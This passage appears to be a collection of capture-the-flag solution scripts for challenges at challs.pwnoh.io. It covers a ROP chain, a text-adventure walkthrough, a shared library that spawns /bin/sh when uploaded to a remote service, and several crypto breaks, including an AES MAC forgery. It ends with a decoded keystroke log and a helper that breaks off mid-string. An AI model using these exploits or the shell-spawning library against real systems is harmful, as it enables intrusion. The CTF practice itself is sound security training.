pd += p64(libc.address + 0x21a200)
pd += p64(libc.search(asm("pop rdx ; pop r12 ; ret")).__next__())
pd += p64(0x30)
pd += p64(0)
pd += p64(libc.sym['write'])
p.sendline(pd)

p.sendline("flag.txtx00")
p.interactive()
```



```
flag <-
<- DeadEnd <- reach through the crack in the rocks <-the crack in the rocks concealing the magical orb with the flag
<- SealedDoor  <- unlock the door <-  Inventory.contains("key")
<- StairwayBottom <- go left
<- StairwayTop <- descend
<- EntryHall <- go middle <- pick up torch 
<- enter

key：
SpiderHallway -> Player.instance.hasItem("sword")
<- River <- 
<- StairwayBottom <- go right
<- StairwayTop <- descend

sword：
AcrossRiver -> pick up sword -> Player.instance.hasItem("rope")
<- River <- throw rope
<- StairwayBottom <- go right
<- StairwayTop <- descend

rope：
CrystalRoom -> pick up rope
<- Bridge <- cross the bridge
<- EntryHall <- go right

nc challs.pwnoh.io 13376
-> enter -> pick up torch -> go right -> (Bridge) -> cross the bridge -> (CrystalRoom) -> pick up rope -> (get the rope) 
-> go back ->  go back ->(EntryHall) -> go middle -> (StairwayTop) -> descend -> (StairwayBottom) -> go right -> (River) 
-> use the rope -> (AcrossRiver) -> pick up sword -> go back -> go back -> go back -> go back -> (EntryHall) 
-> go left -> (SpiderHallway) -> cut the webs -> (KeyRoom) -> pick up key -> (get the key) -> go back -> go back 
-> (EntryHall) -> go middle -> (StairwayTop) -> descend -> (StairwayBottom) -> go left -> (SealedDoor) -> unlock the door
-> (DeadEnd) ->reach through the crack in the rocks -> the crack in the rocks concealing the magical orb with the flag
```



```
from pwn import *

r = remote('challs.pwnoh.io', 13376)

r.sendline(b'enter')
r.sendline(b'pick up torch')
r.sendline(b'go right')
r.sendline(b'cross the bridge')
r.sendline(b'pick up rope')
r.sendline(b'go back')
r.sendline(b'go back')
r.sendline(b'go middle')
r.sendline(b'descend')
r.sendline(b'go right')
r.sendline(b'use the rope')
r.sendline(b'pick up sword')
r.sendline(b'go back')
r.sendline(b'go back')
r.sendline(b'go back')
r.sendline(b'go back')
r.sendline(b'go left')
r.sendline(b'cut the webs')
r.sendline(b'pick up key')
r.sendline(b'go back')
r.sendline(b'go back')
r.sendline(b'go middle')
r.sendline(b'descend')
r.sendline(b'go left')
r.sendline(b'unlock the door')
r.sendline(b'reach through the crack in the rocks')
r.sendline(b'the crack in the rocks concealing the magical orb with the flag')

print(r.recvuntil(b'> '))

r.interactive()
```



```
; <COMPILER: v1.1.37.02>
global flaginput := ""
logInput(key){
global flaginput
flaginput := flaginput . key
flaginput := SubStr(flaginput,-28)
checkInput()
}
checkInput(){
global flaginput
if (StrLen(flaginput) != 29)
return
if (SubStr(flaginput, 1, 5) != "bctf{" or SubStr(flaginput,0) != "}")
return
encrypted_flag := [62,63,40,58,39,40,111,63,52,50,53,63,104,48,48,37,3,61,3,55,57,37,48,108,59,59,111,46,33]
Loop 29
{
if ((encrypted_flag[A_Index] ^ 92) != Asc(SubStr(flaginput,A_Index,1))) {
MsgBox, You typed the wrong flag.
return
}
}
MsgBox, You typed the right flag!
}
```



```
#include <stdio.h>

void thank() {
    printf("this is test in my thank()n");
    system("echo this is test in systemn");
    system("/bin/sh");
}

#gcc -fPIC -shared -o libthank.so thank.c
```



```
from pwn import remote,p64,context
#from LibcSearcher import *
import re

local=0
if local==1:
    p=remote('192.168.202.129',10001)
else:
    p=remote('challs.pwnoh.io',13373)
    
# context.log_level='debug'    
# context.arch='amd64'
# context.os='linux'

try:
    with open("./libthank.so",'rb') as f:
        data=f.read()
    size=len(data)
    print(str(size))
    p.recvuntil(b'What is the size of your file (in bytes)? ')
    p.sendline(str(size))
    p.recvuntil(b'Send your file!n')
    p.send(data)
    

except Exception as e:
    print(f"error: {e}")
finally:
    p.interactive()
```



```
from Crypto.Util.number import *

data = b'Blue is greener than purple for sure!'

enc = long_to_bytes(0xfe9d88f3d675d0c90d95468212b79e929efffcf281d04f0cfa6d07704118943da2af36b9f8)

key = b""
for i,j in zip(data,enc):
    key += int.to_bytes(i^j)

flag = b""
enc = long_to_bytes(0xde9289f08d6bcb90359f4dd70e8d95829fc8ffaf90ce5d21f96e3d635f148a68e4eb32efa4)
for i,j in zip(key,enc):
    flag += int.to_bytes(i^j)

print(flag)
```



```
from Crypto.Util.number import *

p = 213055785127022839309619937270901673863
q = 310165339100312907369816767764432814137
c = 19146395818313260878394498164948015155839880044374872805448779372117637653026

phi = (p-1)*(q-1)

d = pow(0x10001, -1, phi)
m = pow(c, d, p*q)
print(long_to_bytes(m))
```



```
from pwn import *
from Crypto.Cipher import AES
my_message = "n".join(
    [
        "Grate the raw potatoes with a cheese grater, place them into a bowl and cover completely with water. Let sit for 10 minutes.",
        "Drain the grated potatoes well; if this is not done thoroughly the potatoes will steam instead of fry.",
        "Mix in chopped onions by hand.",
        "Mix the egg OR flour into the hash brown mixture evenly. This will allow the hash browns to stay together when frying.",
        "Place a large frying pan on medium-high heat and add enough oil to provide a thin coating over the entire bottom of the pan.",
        "When the oil has come up to temperature apply a large handful of potatoes to the pan and reshape into a patty that is about 1/4-1/2 inch (6-12 mm) thick. The thinner the patty, the crispier the hash browns will be throughout.",
        "Flip when they are crisp and brown on the cooking side. They should also stick together nicely before they are flipped. This should take about 5-8 minutes.",
        "The hash browns are done when the new side is brown and crispy. This should take another 3-5 minutes.",
    ]
).encode()

def pad(data):
    padding_length = 16 - len(data) % 16
    return data + b"_" * padding_length

def aes(block: bytes, key: bytes) -> bytes:
    assert len(block) == len(key) == 16
    return AES.new(key, AES.MODE_ECB).encrypt(block)

io = remote("challs.pwnoh.io", 13419)
io.recvuntil(b"Signature:n")
sign = bytes.fromhex(io.recv(32).decode())
message = pad(my_message)
message += b"french fry"
io.recvuntil(b"(as hex)n> ")
io.sendline(message.hex().encode())
message = pad(message)
sign_new = aes(message[-16:], sign)
io.recvuntil(b"signiature?n> ")
io.sendline(sign_new.hex().encode())
io.interactive()
```



```
from pwn import *
import random
import time

context.log_level = "debug"

io = remote("challs.pwnoh.io", 13421)
n = 19261756194530262169516227535327268535825703622469356233861243450409596218324982327819027354327762272541787979307084854543427241827543331732057807638293377995167826046761991463655794445629511818504788588146049602678202660790161211079215140614149179394809442098536009911202757117559092796991732111808588753074002377241720729762405118846289128192452140379045358673985940236403266552967867241351260376075804662700969038717732248036975281084947926661161892037413944872628410488986135370175176475239647256670545733839891394321932103696968961386864456665963903759123610214930997530883831800104920546270573046968308379346633
random.seed(int(time.time()+1))
x = random.randrange(1, n)
y = pow(x, 2, n)

for i in range(1,129):
    b = random.randrange(2)
    if b == 0:
        s = i * i
    else :
        s = i * i * y
    
    z = i * x

    io.recvuntil(b"s: ")
    io.sendline(str(s).encode())
    io.recvuntil(b"z: ")
    io.sendline(str(z).encode())

io.interactive()
```



```
flag：Bblog<SPACE>enttry<SPACE>#216<RET><RET>Ttt<DEL>itle"<SPACE>Tthe<SPACE>Sttrn<DEL>ange<SPACE>andd<SPACE>uunssettliinng<SPACE>Rreality<SPACE>of<SPACE>d<DEL><DEL>Ducls<DEL><DEL>ks'<SPACE>Spiral-Ssahpe<DEL><DEL><DEL><DEL>a<DEL>haped...<DEL><DEL><DEL><SPACE>Pennnis<DEL><DEL><DEL><DEL><DEL>Ddoonts<DEL><DEL>s<DEL><DEL>ggs?<DEL><DEL><DEL><DEL><DEL><DEL>Ddiicks?<DEL><DEL><DEL><DEL><DEL><DEL><DEL>Ppenises.<RET><RET>Ttheerre<SPACE>aarre<SPACE>soomme<SPACE>faactts<SPACE>yoou<SPACE>stumvl<SPACE><DEL>e<SPACE>uppon<SPACE>iin<SPACE>liffee<SPACE>thaatt<SPACE>lleae<DEL>ve<SPACE>yoou<SPACE>u<DEL>changed<SPACE><DEL>.<SPACE><SPACE>I'm<SPACE>nnott<SPACE>tallkiinng<SPACE>aboout<SPACE>ggrand<SPACE>rrevvelatiions<SPACE>like<SPACE>rrealiziinng<SPACE>the<SPACE>mmeeaniinng<SPACE>of<SPACE>existencce<SPACE><DEL>,<SPACE>bbut<SPACE>ratheerr<SPACE>thoosse<SPACE>little,,<SPACE>often<SPACE>uunwwanted,,<SPACE>tidbiitts<SPACE>of<SPACE>kknowledgge<SPACE>of<SPACE><DEL><DEL><DEL>thhaat<SPACE>o<DEL>soommehow<SPACE>mannagge<SPACE>tto<SPACE>woork<SPACE><DEL><DEL>m<SPACE>thheir<SPACE><SPACE>wa<DEL><DEL>wwa<DEL><DEL><DEL>wway<SPACE>iinto<SPACE>yoour<SPACE>brraiin<SPACE>andd<SPACE>stay<SPACE>thheerre.<SPACE><SPACE>Forever.....<SPACE><SPACE>Ffor<SPACE>me,,<SPACE>oonne<SPACE>of<SPACE>thosss<SPACE>factts<SPACE>is<SPACE>thhis"<SPACE>ducs<DEL>ks<SPACE>hhavvee<SPACE>sppiral-shaped<SPACE>ppenniess<DEL><DEL>ees.<RET><RET>o<DEL>Now,,<SPACE>beforree<SPACE>yoou<SPACE>click<SPACE>aaway,<SPACE>thhinnkiingg<SPACE>tthhiss<SPACE>is<SPACE>soome<SPACE>sort<SPACE>oof<SPACE>absurd<SPACE>prank<SPACE>or<SPACE>ooutlandish<SPACE>clickbait-llet<SPACE>me<SPACE>aassuue<SPACE>y<DEL><DEL><DEL>rre<SPACE>yooooo<DEL><DEL>u,<SPACE>tthhiis<SPACE>iis<SPACE>rreal.<SPACE>**t<DEL><DEL>Ttoo**<SPACE>rreal,,<SPACE>if<SPACE>I<SPACE>may<SPACE>ssay.<SPACE><SPACE>Dducks<SPACE><DEL>,,<SPACE>thosse<SPACE>quait<DEL>nnt<SPACE>i<DEL>little<SPACE>crreeaturres<SPACE>thhaatt<SPACE>waaddle<SPACE>by<SPACE>pondds<SPACE><SPACE>and<SPACE>quacck<SPACE>at<SPACE>ppaasseersby,,<SPACE>hhavvee<SPACE>genitalia<SPACE>thhaatt<SPACE>ccorkscrrew<SPACE>iin<SPACE>wway<SPACE>I<SPACE>nneverr<SPACE>tthoouuggh<SPACE><DEL><DEL>t<SPACE>ppoossible<DEL><DEL>e<DEL>lle<SPACE>oor<SPACE>neccessaary.<SPACE>Tthe<SPACE>firsst<SPACE>tiime<SPACE>I<SPACE>leearned<SPACE>aaboout<SPACE>thhiss<SPACE><DEL>,,<SPACE>my<SPACE>iimmediatte<SPACE>rrespponnsse<SPACE>waas<SPACE><SPACE>a<SPACE>bewilderredd<SPACE>whhy:W<DEL>whhy:<DEL>?:<SPACE>followed<SPACE>bby<SPACE>a<SPACE>slow<SPACE>crreepiing<SPACE>discomfoort<SPACE>thhaatt<SPACE>I<SPACE>havb<DEL>n't<SPACE>bbeeen<SPACE>able<SPACE>tto<SPACE>shaarke<SPACE>of<DEL><DEL><DEL><DEL><DEL><DEL><DEL>le<SPACE>of<DEL><DEL><DEL><DEL><DEL>ke<SPACE>off<SPACE>siincce.<RET><RET>I<SPACE>supposse<SPACE>thhe<SPACE>first<SPACE>queesstiion<SPACE><SPACE>wwe<SPACE>shoould<SPACE>all<SPACE><SPACE>aask<SPACE>is,,<SPACE>:How<SPACE>did<SPACE>I<SPACE>evven<SPACE>ccoome<SPACE>across<SPACE>thhiis<SPACE>iinfoormattiion?:<SPACE><SPACE>Wweell,,<SPACE>Ll<DEL>likke<SPACE>all<SPACE><SPACE>e<DEL>uunexpectted<SPACE>joournets,,<SPACE><DEL><DEL><DEL><DEL><DEL>yys,,<SPACE>I<SPACE><DEL>i<DEL><DEL><DEL>it<SPACE>m<DEL>behan<SPACE>n<DEL>i<DEL><DEL><DEL><DEL><DEL><DEL>gan<SPACE>iinnocently<SPACE>enoouggh.<SPACE>I<SPACE>waas<SPACE>ddeep<SPACE>iinto<SPACE>an<SPACE>iinnteerneet<SPACE>rrabbit<SPACE>hole<SPACE>oone<SPACE>eveniing,,<SPACE>startiing<SPACE>witth<SPACE>whollesoomme<SPACE>videos<SPACE>of<SPACE>duuckiin<DEL><DEL>liin<DEL><DEL>gs<SPACE>lleearniinng<SPACE>tto<SPACE>swiim,<DEL>.<SPACE>Tthhat<SPACE>shoould<SPACE>havve<SPACE>been<SPACE>my<SPACE>cue<SPACE>tto<SPACE>sstoop.<SPACE>Butt<SPACE>tthe<SPACE>curiosity<SPACE>maachiine<SPACE>thhatt<SPACE>is<SPACE>thhe<SPACE>iinntteerneet<SPACE>is<SPACE>rrelentless,,<SPACE>and<SPACE><SPACE>aafteerr<SPACE>cclickiing<SPACE>ffrroom<SPACE>oonne<SPACE>an<DEL><DEL>nnaturre<SPACE>docuumentat<DEL><DEL>rry<SPACE>tto<SPACE>anottheer,,<SPACE>I<SPACE>su<DEL>tuumblled<SPACE>upun<SPACE>th<DEL><DEL><DEL><DEL><DEL>oon<SPACE>thhe<SPACE>uunnssel<DEL>ttle<DEL>iinng<SPACE>faact<SPACE>thhaat<SPACE>malle<SPACE>ducks,,<SPACE>SPPEECIFICALLY<SPACE><SPACE>drakees<SPACE><DEL>,,<SPACE>a<DEL>hae<DEL>vve<SPACE>penisses<SPACE>thhaat<SPACE><SPACE>aarree<SPACE>shapedd<SPACE>likke<SPACE>ccorksscrrews.<RET><RET>Aat<SPACE>first,<SPACE><SPACE>I<SPACE>didn't<SPACE>believve<SPACE>it.<SPACE><SPACE>I<SPACE>meean<SPACE><DEL>,,<SPACE>whhy<SPACE>soou<DEL><DEL>wo<DEL><DEL><DEL><DEL>woould<SPACE>a<SPACE>duck;a<DEL><DEL>'s<SPACE>rreprou<DEL>ductivve<SPACE>oorgan<SPACE>*need(<DEL><DEL>*<SPACE>to<SPACE>rresemble<SPACE>a<DEL>sooomethiing<SPACE>u<DEL>yoou<SPACE>oopen<SPACE>a<SPACE>bottle<SPACE>of<SPACE>of<DEL><DEL>wiine???<SPACE>Iit<SPACE>felt<SPACE>lie<SPACE><DEL><DEL>ke<SPACE>one<SPACE>of<SPACE>thosse<SPACE>qur<DEL>r<DEL>irky<SPACE><DEL>,,<SPACE>uunnes<DEL><DEL>ccessaary<SPACE>adaptattiions<SPACE>thhaatt<SPACE>evolt<DEL>utiion<SPACE>soommetiimmeess<SPACE>ccoomme<SPACE><DEL><DEL>s<SPACE>up<SPACE>with<SPACE>for<SPACE>rreaasoons<SPACE>thaat<SPACE>nno<SPACE>oone<SPACE>rreallly<SPACE>aaskked<SPACE>for.<SPACE>but<SPACE>the<SPACE>kkk<DEL><DEL>mmorre<SPACE>I<SPACE>rread<SPACE><SPACE>(aandd<SPACE>I<SPACE>rreaad<SPACE>alot<DEL><DEL><DEL><DEL><DEL>ALOT),,<SPACE>the<SPACE>mmoorree<SPACE>uuncoomforatble<SPACE><SPACE>I<SPACE>became.<SPACE><SPACE>I<SPACE><SPACE>coouldn't<SPACE>stoop<SPACE>a<DEL>iimmagiiniinng<SPACE>it.<RET><RET><CAP><CAP><CAP>m<DEL>mmag<DEL><DEL><DEL><DEL><CAP>magiinge<DEL><DEL>e<SPACE>duckks<SPACE>a<DEL><DEL>wwaaddliing<SPACE>aroound,,<SPACE>their<SPACE>ssppiral-shaped<SPACE>anatoomy<SPACE>hidden<SPACE>beneeath<SPACE>thosse<SPACE>sseemiinglt<SPACE>iinnocent<SPACE>fath<DEL><DEL>ea<DEL><DEL><DEL><DEL>eeah<DEL>thheer<SPACE><DEL><DEL>s,,<SPACE>wwaiitiing<SPACE>for<SPACE>t<DEL>jjuusst<SPACE>the<SPACE>right<SPACE>moment,<SPACE><SPACE>It's<SPACE>bizarrely<SPACE>elaboratte<SPACE>for<SPACE>a<SPACE>bird,,<SPACE>coonsideriing<SPACE>thhat<SPACE>mmmosst<SPACE>birdds<SPACE>doon't<SPACE>evveen<SPACE>*hhavve8*<SPACE><DEL><DEL>*<SPACE>penises.<SPACE><SPACE>Ttheey<SPACE>makke<SPACE>ddo<SPACE>witth<SPACE>soommethiing<SPACE>caalled<SPACE>a<SPACE>cloacal<SPACE>kiss,,<SPACE>whheerre<SPACE>thheir<SPACE>rreproduuci<DEL><DEL>tivve<SPACE>oorgans<SPACE>briefly<SPACE>toouch.<SPACE>Dducks,,<SPACE>n<DEL>oon<SPACE>thhe<SPACE>oothheerr<SPACE>hand,,<SPACE>went<SPACE>the<SPACE>exttraa<SPACE>miile<SPACE>with<SPACE><SPACE>a<SPACE>coomplex,,<SPACE>ccooiled<SPACE>maachanism.<SPACE>Iit's<SPACE>almosst<SPACE>aas<SPACE>if<SPACE>naturre,,<SPACE>iin<SPACE>foom<DEL><DEL><DEL><DEL>soome<SPACE>sttrangge<SPACE>g<DEL><DEL>fiit<SPACE>of<SPACE>whiimsy<SPACE>said,,<SPACE>:Yoou<SPACE>kknow<SPACE>what<SPACE>duckks<SPACE>nees<DEL><DEL>d?<SPACE><SPACE>A<SPACE>penniis<SPACE>thhaatt<SPACE>looks<SPACE>lie<SPACE>a<SPACE><DEL><DEL><DEL><DEL>kke<SPACE>a<SPACE>pei<DEL><DEL><DEL>ieccee<SPACE>off<SPACE>ppat<DEL><DEL>sta.:<RET><RET>Bu<SPACE><DEL>t<SPACE>it<SPACE>doeessn't<SPACE>sstoop<SPACE>thheer.<DEL>e.<SPACE>Oh<SPACE>nno.<SPACE>Aas<SPACE>if<SPACE>thhe<SPACE>spiral<SPACE>shape<SPACE>waasn't<SPACE>uunssettliing<SPACE>enoouuggh,<SPACE>thhe<SPACE>whole<SPACE>proccess<SPACE>f<DEL><DEL>of<SPACE>duck<SPACE>rreproductiion<SPACE>is<SPACE>ffraught<SPACE>witth<SPACE>weirdnness<SPACE>aand,,<SPACE>ffraankly<SPACE>b<DEL><DEL>,,<SPACE>biiole<DEL>viiolencce.<SPACE><SPACE>Ffemale<SPACE>ducs<DEL>ks,,<SPACE>it<SPACE>turns<SPACE>oouut,,<SPACE>evolved<SPACE>a<SPACE>coounteer<SPACE><DEL>s<DEL>-sppiral<SPACE>thhaat's<SPACE>rigghht-rreproduuctivve<SPACE>ttract<SPACE>to<SPACE>fend<SPACE>off<SPACE>uunwwanted<SPACE>advanccees,,<SPACE>beecausse<SPACE>yees,<SPACE>the<SPACE>u<DEL><DEL>duck<SPACE>world<SPACE>is<SPACE>riffe<SPACE>witth<SPACE>rreproduuctivve<SPACE>coercioon.<SPACE>Tthhaat's<SPACE>right-naturre<SPACE>designed<SPACE>an<SPACE>enttri<DEL><DEL>iirre<SPACE>systeem<SPACE>wheerre<SPACE>male<SPACE>aandd<SPACE>ffemale<SPACE>anatomy<SPACE><SPACE>aarre<SPACE>*8att<SPACE>odss<DEL><DEL><DEL>dds(<DEL>*<SPACE>wwith<SPACE><SPACE>each<SPACE>othheer,<SPACE>sppiraling<SPACE>wiin<DEL><DEL><DEL>iin<SPACE>oopposite<SPACE>dirrecto<DEL>yiion<DEL><DEL><DEL><DEL>tiions,,<SPACE>all<SPACE>iin<SPACE>the<SPACE>name<SPACE>of<SPACE><DEL>,,<SPACE>wwel<DEL><DEL>l<DEL>wll,,<SPACE>survival?<RET><RET>So<SPACE>nnow,,<SPACE>every<SPACE>tiime<SPACE>I<SPACE>ssee<SPACE>a<SPACE>duck<SPACE>floatiinng<SPACE>graccefully<SPACE>acc<DEL>ross<SPACE>a<SPACE>pong,,<SPACE>I<SPACE>cccan't<SPACE>help<SPACE>bbut<SPACE>feel<SPACE>aa<SPACE>little<SPACE>uuneaasy,<SPACE><SPACE>O<DEL><DEL><DEL>.<SPACE><SPACE>On<SPACE>the<SPACE>surfacce,,<SPACE>thhey<SPACE>sseem<SPACE>calm,,<SPACE>coomppoossed,,<SPACE>aandd<SPACE>ppeerffectly<SPACE>haarmlless.<SPACE>But<SPACE>nnow<SPACE>thaat<SPACE>I<SPACE>kknow<SPACE>whhat's<SPACE>d<DEL>ggoiing<SPACE>oon<SPACE>beneath<SPACE>thosss<SPACE>ffeaturrees,,<SPACE>I<SPACE>ccaan't<SPACE>uune<DEL><DEL>ssee<SPACE>iit.<SPACE>The<SPACE>ppirals<DEL>-shha<DEL>ped<SPACE>ttrc<DEL>uc<DEL>th<DEL><DEL><DEL><DEL>sppiral-shaped-<DEL><DEL><SPACE>ttruth<SPACE>is<SPACE>alwayss<SPACE>theerre<SPACE><DEL>,,<SPACE>lurkiing<SPACE>iin<SPACE>thhe<SPACE>baacckggroound.<SPACE>and<SPACE>hoonesstly,,<SPACE>it<SPACE>makees<SPACE>my<SPACE>iinnteeraactiions<SPACE>witth<SPACE><SPACE>ducks,,,<SPACE>aawkwarre.<DEL><DEL>k<DEL><DEL>d.<SPACE>I<SPACE>meean,,<SPACE>hoow<SPACE>aam<SPACE>I<SPACE>supppoossed<SPACE>tto<SPACE>loook<SPACE>at<SPACE>tthem<SPACE>thhe<SPACE>same<SPACE>wway<SPACE>aa<DEL>gaiin?<RET><RET>enteerthhe<SPACE>fs<DEL><DEL><DEL>fla<DEL>enteer<SPACE>thha<DEL><DEL><DEL>th<DEL><DEL><DEL>thhefla<DEL>ag.coom<RET><RET><RET>bcrf<DEL><DEL>tf{SstSteAlSt0p_s3nd1Ng_me<DEL>3_d<DEL>DuCK_p1cs<DEL>$}<RET><RET>I<SPACE>thhink<SPACE>m<DEL>what<SPACE>mmakkeess<SPACE>it<SPACE>paarticulaarly<SPACE>uuncoomforatble<SPACE>is<SPACE>the<SPACE>jjuxtab<DEL>ppositooo<DEL><DEL>ion<SPACE>t<DEL>betwween<SPACE>the<SPACE>iimmagge<SPACE>wwe<SPACE>haavve<SPACE>oof<SPACE>ducks<SPACE>and<SPACE>thhis<SPACE>peculiar<SPACE>biologiccal<SPACE>faact.<SPACE><SPACE>Dducs<DEL><DEL>cks<SPACE><SPACE>arre<SPACE>ooften<SPACE>associiatted<SPACE>with<SPACE>ppeaceful,,<SPACE>picturesque<SPACE>mmoomentts.<SPACE><SPACE>Yoou<SPACE>e<DEL>ffee<SPACE><DEL>d<SPACE>them<SPACE>brread<SPACE>crumbs<SPACE>iin<SPACE>thhe<SPACE>ppark.<SPACE><SPACE>Yoou<SPACE><SPACE>wwan<DEL><DEL>tch<SPACE>thhem<SPACE>swiim<SPACE>iin<SPACE>ccalm,<SPACE>ssserene<SPACE>pongs.<SPACE>And<SPACE>thhen<SPACE>thheerre's<SPACE>thhis<SPACE>*Ss<DEL>s<DEL><DEL>SPIRAL<SPACE>PENNIIS<SPACE>SITUATIION*<SPACE>lurkiing<SPACE>tthaatjjuust<SPACE>uunndeer<SPACE><SPACE>thhe<SPACE>surfaacce<SPACE><SPACE>(lliterally<SPACE>andd<SPACE>figurativvelly....).<RET><RET>This<SPACE>rrevvelattiion<SPACE>haas<SPACE>caussed<SPACE>m<SPACE><DEL>to<SPACE><DEL><DEL><DEL><DEL>me<SPACE>tto<SPACE>queessttiion<SPACE><SPACE>a<SPACE>lot<SPACE>of<SPACE>thhiggs,<SPACE>Is<SPACE>nne<DEL><DEL>aturre<SPACE>inheerently<SPACE>weird?<SPACE>Arree<SPACE>theerree<SPACE>morre<SPACE>uunssettliinng<SPACE>faactts<SPACE>aboout<SPACE>anm<DEL>imals<SPACE>t<DEL>I<SPACE>ddoon't<SPACE>kknow<SPACE>yt<DEL><DEL>eet-and<SPACE>ddo<SPACE>I<SPACE>event<SPACE><SPACE>*8want*<SPACE>tto<SPACE>kknoow?<SPACE>Ccooulld<SPACE><SPACE>I<SPACE>havve<SPACE>gone<SPACE>my<SPACE>whhole<SPACE>liffe<SPACE>wio<DEL>h<DEL>thoout<SPACE>kknowiingg<SPACE>thhis<SPACE>aaboout<SPACE>dduckks,,<SPACE>and<SPACE>I<SPACE><DEL>woould<SPACE>I<SPACE>be<SPACE>happieer<SPACE>for<SPACE>it?<RET><RET>Inth<DEL><DEL><DEL><SPACE><SPACE>the<SPACE>end,,<SPACE>theerre'ss<SPACE>nno<SPACE>rreal<SPACE>rresolutiion<SPACE>hheerre,,<SPACE>no<SPACE>epiphany<SPACE>thhaat<SPACE>wraps<SPACE>thhiss<SPACE><DEL><SPACE>uunccoomfoortable<SPACE>faact<SPACE>iinto<SPACE>a<SPACE>nneeat<SPACE>littlee<SPACE>bbiw<DEL><DEL><DEL>ow.<SPACE>Ducks<SPACE>havve<SPACE>sppiral-shapedd<SPACE>penisses<SPACE><DEL>,,<SPACE>andd<SPACE>tthaatt'ss<SPACE>jjuusstt<SPACE>how<SPACE>tthee<SPACE>world<SPACE>works.<SPACE>Bbut<SPACE>even<SPACE>aas<SPACE>aI<DEL><DEL>Ii<SPACE>sit<SPACE>heerre<SPACE>wi<DEL><DEL>ritiinng<SPACE>thhis,,<SPACE>with<SPACE>mmmore<SPACE>t<DEL>works<DEL><DEL>dds<SPACE>thhat<DEL>n<SPACE>necessaary<SPACE>oon<SPACE>I<SPACE><DEL><DEL>a<SPACE>uub<DEL><DEL>suubjjeect<SPACE>I<SPACE>nnever<SPACE>iinteer<DEL>nded<SPACE>to<SPACE>delvve<SPACE>iinnto,,<SPACE>I<SPACE>cccaa't<SPACE>c<DEL><DEL>shhake<SPACE>thhe<SPACE>deeliing<SPACE>thhaat<SPACE>soommethiing<SPACE>haas<SPACE>sshifted<SPACE>iin<SPACE>mmy<SPACE>uunndersstandiinngg<SPACE>of<SPACE>the<SPACE>aniimal<SPACE>kiinggs<DEL>doom,,<SPACE>naturre,,<SPACE>aandd<SPACE>liffe.<RET><RET>Sso<SPACE>the<SPACE>next<SPACE>tiime<SPACE>yoou<SPACE>ssee<SPACE>a<SPACE>u<DEL>duck<SPACE>gglidiinng<SPACE>elegantly<SPACE>acrooss<SPACE>a<SPACE>laake,,<SPACE>uus<DEL><DEL>jjuust<SPACE>rremembeer"<SPACE>beneath<SPACE>thhaatt<SPACE>calm<SPACE>exteerior<SPACE>is<SPACE>a<SPACE>corkscrrew<SPACE>of<SPACE>evolutiionary<SPACE>weirdness<SPACE>thhaatt<SPACE>wwill<SPACE>haunt<SPACE>yoou<SPACE>foreveer.<RET>
```



```
def process_string(input_str):
    result = []

    i = 0
    while i < len(input_str):
        if input_str[i:i + 5] == "<DEL>":
            # 如果遇到<DEL>，就删除最后一个字符（如果有的话）
            if result:
                result.pop()  # 删除最后一个字符
            i += 5  # 跳过<DEL>
        else:
            result.append(input_str[i])  # 添加当前字符
            i += 1

    return ''.join(result)

# 示例
input_str ="Bblog<SPACE>enttry<SPACE>#216<RET><RET>Ttt<DEL>itle<SPACE>Tthe<SPACE>Sttrn<DEL>ange<SPACE>andd<SPACE>uunssettliinng<SPACE>Rreality<SPACE>of<SPACE>d<DEL><DEL>Ducls<DEL><DEL>ks<SPACE>Spiral-Ssahpe<DEL><DEL><DEL><DEL>a<DEL>haped...<DEL><DEL><DEL><SPACE>Pennnis<DEL><DEL><DEL><DEL><DEL>Ddoonts<DEL><DEL>s<DEL><DEL>ggs?<DEL><DEL><DEL><DEL><DEL><DEL>Ddiicks?<DEL><DEL><DEL><DEL><DEL><DEL><DEL>Ppenises.<RET><RET>Ttheerre<SPACE>aarre<SPACE>soomme<SPACE>faactts<SPACE>yoou<SPACE>stumvl<SPACE><DEL>e<SPACE>uppon<SPACE>iin<SPACE>liffee<SPACE>thaatt<SPACE>lleae<DEL>ve<SPACE>yoou<SPACE>u<DEL>changed<SPACE><DEL>.<SPACE><SPACE>Im<SPACE>nnott<SPACE>tallkiinng<SPACE>aboout<SPACE>ggrand<SPACE>rrevvelatiions<SPACE>like<SPACE>rrealiziinng<SPACE>the<SPACE>mmeeaniinng<SPACE>of<SPACE>existencce<SPACE><DEL><SPACE>bbut<SPACE>ratheerr<SPACE>thoosse<SPACE>little<SPACE>often<SPACE>uunwwanted<SPACE>tidbiitts<SPACE>of<SPACE>kknowledgge<SPACE>of<SPACE><DEL><DEL><DEL>thhaat<SPACE>o<DEL>soommehow<SPACE>mannagge<SPACE>tto<SPACE>woork<SPACE><DEL><DEL>m<SPACE>thheir<SPACE><SPACE>wa<DEL><DEL>wwa<DEL><DEL><DEL>wway<SPACE>iinto<SPACE>yoour<SPACE>brraiin<SPACE>andd<SPACE>stay<SPACE>thheerre.<SPACE><SPACE>Forever.....<SPACE><SPACE>Ffor<SPACE>me<SPACE>oonne<SPACE>of<SPACE>thosss<SPACE>factts<SPACE>is<SPACE>thhis<SPACE>ducs<DEL>ks<SPACE>hhavvee<SPACE>sppiral-shaped<SPACE>ppenniess<DEL><DEL>ees.<RET><RET>o<DEL>Now<SPACE>beforree<SPACE>yoou<SPACE>click<SPACE>aaway<SPACE>thhinnkiingg<SPACE>tthhiss<SPACE>is<SPACE>soome<SPACE>sort<SPACE>oof<SPACE>absurd<SPACE>prank<SPACE>or<SPACE>ooutlandish<SPACE>clickbait-llet<SPACE>me<SPACE>aassuue<SPACE>y<DEL><DEL><DEL>rre<SPACE>yooooo<DEL><DEL>u<SPACE>tthhiis<SPACE>iis<SPACE>rreal.<SPACE>**t<DEL><DEL>Ttoo**<SPACE>rreal<SPACE>if<SPACE>I<SPACE>may<SPACE>ssay.<SPACE><SPACE>Dducks<SPACE><DEL><SPACE>thosse<SPACE>quait<DEL>nnt<SPACE>i<DEL>little<SPACE>crreeaturres<SPACE>thhaatt<SPACE>waaddle<SPACE>by<SPACE>pondds<SPACE><SPACE>and<SPACE>quacck<SPACE>at<SPACE>ppaasseersby<SPACE>hhavvee<SPACE>genitalia<SPACE>thhaatt<SPACE>ccorkscrrew<SPACE>iin<SPACE>wway<SPACE>I<SPACE>nneverr<SPACE>tthoouuggh<SPACE><DEL><DEL>t<SPACE>ppoossible<DEL><DEL>e<DEL>lle<SPACE>oor<SPACE>neccessaary.<SPACE>Tthe<SPACE>firsst<SPACE>tiime<SPACE>I<SPACE>leearned<SPACE>aaboout<SPACE>thhiss<SPACE><DEL><SPACE>my<SPACE>iimmediatte<SPACE>rrespponnsse<SPACE>waas<SPACE><SPACE>a<SPACE>bewilderredd<SPACE>whhy:W<DEL>whhy:<DEL>?:<SPACE>followed<S